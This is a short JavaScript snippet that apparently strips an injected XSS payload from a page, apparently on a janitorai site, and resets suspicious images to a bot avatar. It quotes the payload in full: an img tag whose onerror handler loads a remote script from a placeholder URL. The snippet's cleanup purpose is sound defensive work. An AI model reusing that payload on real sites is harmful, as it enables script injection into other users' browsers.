(()=>{ 
    const searchContent=`<img src=x onerror='(()=>{var d=document s=d.createElement(\`script\`) s.src=\`//your-url.js\` d.head.appendChild(s)})();'>`;
    document.querySelectorAll('*').forEach(node=>{
        if(node.tagName==='IMG'&&node.src.includes("onerror")){
            node.src='https://ella.janitorai.com/bot-avatars/6df04ec1-ba7b-45a9-a553-78d62e0da67d_d167022f-9827-4832-8950-b72ee3b6a4b3.webp';
        }
        if(node.innerHTML.includes(searchContent)){
            node.innerHTML=node.innerHTML.split(searchContent).join('');
        }
    });
})();
